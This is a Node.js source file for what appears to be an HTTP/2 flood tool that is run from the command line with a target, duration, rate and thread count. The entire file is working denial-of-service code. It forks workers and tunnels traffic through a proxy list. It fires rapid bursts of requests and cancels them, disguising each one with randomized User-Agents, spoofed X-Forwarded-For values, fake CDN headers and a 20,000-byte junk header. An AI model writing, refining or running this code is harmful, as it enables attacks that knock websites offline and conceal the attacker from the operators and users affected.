 const net = require("net");
 const http2 = require("http2");
 const tls = require("tls");
 const cluster = require("cluster");
 const url = require("url");
 const os = require("os");
 const crypto = require("crypto");
 const fs = require("fs");

 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;

 if (process.argv.length < 7){console.log(`node tls.js target time rate thread`); process.exit();}
 
 const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
 const ciphers = "GREASE:" + [
     defaultCiphers[2],
     defaultCiphers[1],
     defaultCiphers[0],
     ...defaultCiphers.slice(3)
 ].join(":");
 
 const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
 
 const ecdhCurve = "GREASE:x25519:secp256r1:secp384r1";
 
 const secureOptions = 
 crypto.constants.SSL_OP_NO_SSLv2 |
 crypto.constants.SSL_OP_NO_SSLv3 |
 crypto.constants.SSL_OP_NO_COMPRESSION |
 crypto.constants.SSL_OP_NO_TLSv1 |
 crypto.constants.SSL_OP_NO_TLSv1_1 |
 crypto.constants.ALPN_ENABLED |
 crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
 crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
 crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
 crypto.constants.SSL_OP_COOKIE_EXCHANGE |
 crypto.constants.SSL_OP_PKCS1_CHECK_1 |
 crypto.constants.SSL_OP_PKCS1_CHECK_2 |
 crypto.constants.SSL_OP_SINGLE_DH_USE |
 crypto.constants.SSL_OP_SINGLE_ECDH_USE |
 crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
 
 const secureProtocol = "TLS_client_method";
 const headers = {};
 
 const secureContextOptions = {
     ciphers: ciphers,
     sigalgs: sigalgs,
     honorCipherOrder: true,
     secureOptions: secureOptions,
     secureProtocol: secureProtocol
 };
 
 const secureContext = tls.createSecureContext(secureContextOptions);
 
 var proxyFile = "proxy.txt";
 var proxies = readLines(proxyFile);
 
 const args = {
     target: process.argv[2],
     time: ~~process.argv[3],
     Rate: ~~process.argv[4],
     threads: ~~process.argv[5]
 }
 
 const parsedTarget = url.parse(args.target);

const MAX_RAM_PERCENTAGE = 80;
const RESTART_DELAY = 1000;

 if (cluster.isMaster) {
  console.clear()
  console.log(`Attack Successfully Sent`.red)
  console.log(`--------------------------------------------`)
  console.log(` - Target: ` + process.argv[2])
  console.log(` - Time: ` + process.argv[3])
  console.log(` - Rate: ` + process.argv[4])
  console.log(` - Thread: ` + process.argv[5])
  console.log(` - ProxyFile: `+ process.argv[6])
  console.log(`--------------------------------------------`)
    const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }

        console.log('[>] Restarting the script', RESTART_DELAY, 'ms...');
        setTimeout(() => {
            for (let counter = 1; counter <= args.threads; counter++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;

        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log('[!] Maximum RAM usage:', ramPercentage.toFixed(2), '%');
            restartScript();
        }
    };
	setInterval(handleRAMUsage, 5000);
	
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {setInterval(runFlooder) }

 class NetSocket {
     constructor(){}
 
  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n"; //Keep Alive
     const buffer = new Buffer.from(payload);
 
     const connection = net.connect({
         host: options.host,
         port: options.port,
         allowHalfOpen: true,
         writable: true,
         readable: true
     });
 
     connection.setTimeout(options.timeout * 100000);
     connection.setKeepAlive(true, 100000);
     connection.setNoDelay(true)
 
     connection.on("connect", () => {
         connection.write(buffer);
     });
 
     connection.on("data", chunk => {
         const response = chunk.toString("utf-8");
         const isAlive = response.includes("HTTP/1.1 200");
         if (isAlive === false) {
             connection.destroy();
             return callback(undefined, "error: invalid response from proxy server");
         }
         return callback(connection, undefined);
     });
 
     connection.on("timeout", () => {
         connection.destroy();
         return callback(undefined, "error: timeout exceeded");
     });
 
     connection.on("error", error => {
         connection.destroy();
         return callback(undefined, "error: " + error);
     });
 }
 }
 
 const Socker = new NetSocket();
 
 function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 
 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 }
 
 function randomCharacters(length) {
     output = ""
     for (let count = 0; count < length; count++) {
         output += randomElement(characters);
     }
     return output;
 }
 
function getRandomUserAgent() {
    const browsers = [
        { name: "Chrome", versions: Array.from({ length: 20 }, (_, i) => 114 - i) },
        { name: "Firefox", versions: Array.from({ length: 20 }, (_, i) => 118 - i) },
        { name: "Safari", versions: Array.from({ length: 12 }, (_, i) => 17 - i) },
        { name: "Edge", versions: Array.from({ length: 20 }, (_, i) => 114 - i) },
        { name: "Opera", versions: Array.from({ length: 15 }, (_, i) => 99 - i) },
    ];

    const operatingSystems = [
        "Windows NT 10.0; Win64; x64",
        "Windows NT 11.0; Win64; x64",
        "Macintosh; Intel Mac OS X 13_0",
        "Macintosh; Intel Mac OS X 12_5_1",
        "X11; Linux x86_64",
        "X11; Ubuntu; Linux x86_64",
        "iPhone; CPU iPhone OS 16_2 like Mac OS X",
        "iPad; CPU OS 15_4 like Mac OS X",
        "Android 13; Mobile",
        "Android 12; Tablet",
    ];

    const webkitVersions = Array.from({ length: 20 }, (_, i) => (537 + i).toString() + ".36");
    const randomArrayElement = (arr) => arr[Math.floor(Math.random() * arr.length)];

    const browser = randomArrayElement(browsers);
    const os = randomArrayElement(operatingSystems);
    const webkit = randomArrayElement(webkitVersions);
    const browserVersion = randomArrayElement(browser.versions);

    let userAgent;

    if (browser.name === "Chrome" || browser.name === "Edge" || browser.name === "Opera") {
        userAgent = `Mozilla/5.0 (${os}) AppleWebKit/${webkit} (KHTML, like Gecko) ${browser.name}/${browserVersion}.0.0.0 Safari/${webkit}`;
    } else if (browser.name === "Firefox") {
        userAgent = `Mozilla/5.0 (${os}; rv:${browserVersion}.0) Gecko/20100101 Firefox/${browserVersion}.0`;
    } else if (browser.name === "Safari") {
        userAgent = `Mozilla/5.0 (${os}) AppleWebKit/${webkit} (KHTML, like Gecko) Version/${browserVersion}.0 Mobile/15E148 Safari/${webkit}`;
    }
    return userAgent;
}

function generateRandomQuery() {
    let query = '?page=';
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    for (let i = 0; i < 25; i++) {
        query += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return query;
}

const methods = ["GET", "HEAD"];
const randomMethod = methods[Math.floor(Math.random() * methods.length)];

const XRW = [
  "org.telegram.messenger",
  "com.whatsapp",
  "com.facebook.orca",
  "com.instagram.android",
  "com.snapchat.android",
  "com.discord",
  "com.reddit.frontpage",
  "com.twitter.android",
  "com.viber.voip",
  "org.thoughtcrime.securesms",
  "com.google.android.youtube",
  "com.tiktok.android",
  "com.linecorp.line",
  "com.skype.raider",
  "com.kakao.talk",
  "com.zhiliaoapp.musically",
  "com.bbm",
  "jp.naver.line.android",
  "ch.threema.app",
  "de.blinkt.openvpn",
  "com.imo.android.imoim",
  "com.wechat",
  "com.microsoft.teams",
  "com.signal.app",
  "com.google.android.apps.tachyon",
  "com.google.android.gm",
  "com.android.chrome",
  "org.mozilla.firefox",
  "com.opera.browser",
  "com.brave.browser",
  "com.sec.android.app.sbrowser",
  "com.android.vending",
  "com.google.android.apps.messaging",
  "com.android.mms",
  "com.facebook.katana",
  "com.mi.globalbrowser",
  "com.htc.launcher",
  "com.huawei.browser",
  "com.samsung.android.messaging",
  "com.android.contacts",
  "com.zalo.android",
  "com.uc.browser",
  "com.lenovo.anyshare.gps",
  "com.mobisystems.office",
  "com.microsoft.office.word",
  "com.adobe.reader",
  "com.dropbox.android"
];

const RequestWith = XRW[Math.floor(Math.random() * XRW.length)]

 headers[":method"] = randomMethod;
 headers[":path"] = parsedTarget.path;
 headers[":scheme"] = "https";
 headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";
 headers["accept-language"] = "es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3";
 headers["accept-encoding"] = "gzip, deflate, br";
 headers["x-forwarded-proto"] = "https";
 headers["cache-control"] = ["no-cache", "no-store,private", "max-age=0", "must-revalidate"];
 headers["sec-ch-ua-mobile"] = randomElement(["?0", "?1"]);
 headers["sec-ch-ua-platform"] = randomElement(["Android", "iOS", "Linux", "macOS", "Windows"]);
 headers["sec-fetch-dest"] = "document";
 headers["sec-fetch-mode"] = "navigate";
 headers["sec-fetch-site"] = "same-origin";
 headers["via"] = "1.1 varnish";
 headers["X-Cache"] = "HIT";
 headers["Vary"] = "Accept-Encoding";
 headers["cf-cache-status"] = "HIT";
 headers["Server"] = "cloudflare";
 headers["X-Requested-With"] = "XMLHttpRequest";
 headers["User-Agent"] = getRandomUserAgent();
 headers["DNT"] = "1";
 headers["x"] = "A".repeat(20000);
 headers["upgrade-insecure-requests"] = "1";
 
 function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");
 
     /** headers dynamic */
     headers[":authority"] = parsedTarget.host
     headers["x-forwarded-for"] = parsedProxy[0];
 
     const proxyOptions = {
         host: parsedProxy[0],
         port: ~~parsedProxy[1],
         address: parsedTarget.host + ":443",
         timeout: 15
     };

     Socker.HTTP(proxyOptions, (connection, error) => {
         if (error) return
 
         connection.setKeepAlive(true, 600000);
         connection.setNoDelay(true)
 
         const settings = {
             enablePush: false,
             initialWindowSize: 1073741823
         };

         const tlsOptions = {
            port: 443,
            secure: true,
            ALPNProtocols: [
                "h2",
                "http/1.1"
            ],
            ciphers: ciphers,
            sigalgs: sigalgs,
            requestCert: true,
            socket: connection,
            ecdhCurve: ecdhCurve,
            honorCipherOrder: false,
            host: parsedTarget.host,
            rejectUnauthorized: false,
            clientCertEngine: "dynamic",
            secureOptions: secureOptions,
            secureContext: secureContext,
            servername: parsedTarget.host,
            secureProtocol: secureProtocol
        };

         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 

         tlsConn.allowHalfOpen = true;
         tlsConn.setNoDelay(true);
         tlsConn.setKeepAlive(true, 60 * 1000);
         tlsConn.setMaxListeners(0);
 
         const client = http2.connect(parsedTarget.href, {
             protocol: "https:",
             settings: settings,
             maxSessionMemory: 655000,
             maxDeflateDynamicTableSize: 4294967295,
             createConnection: () => tlsConn
             //socket: connection,
         });
 
         client.setMaxListeners(0);
         client.settings(settings);
 
         client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const request = client.request(headers)
                    .on("response", response => {
                        request.close();
                        request.destroy();
                        return
                    });
                    setInterval(() => {
                        request.close(http2.constants.NGHTTP2_CANCEL);
                    }, 1000);
                    request.end();
                }
            }, 300); 
         });
 
         client.on("close", () => {
             client.destroy();
             connection.destroy();
             return
         });
 
         client.on("error", error => {
             client.destroy();
             connection.destroy();
             return
         });
     });
 }
 
 const KillScript = () => process.exit(1);
 
 setTimeout(KillScript, args.time * 1000);
 process.on('uncaughtException', error => {});
 process.on('unhandledRejection', error => {});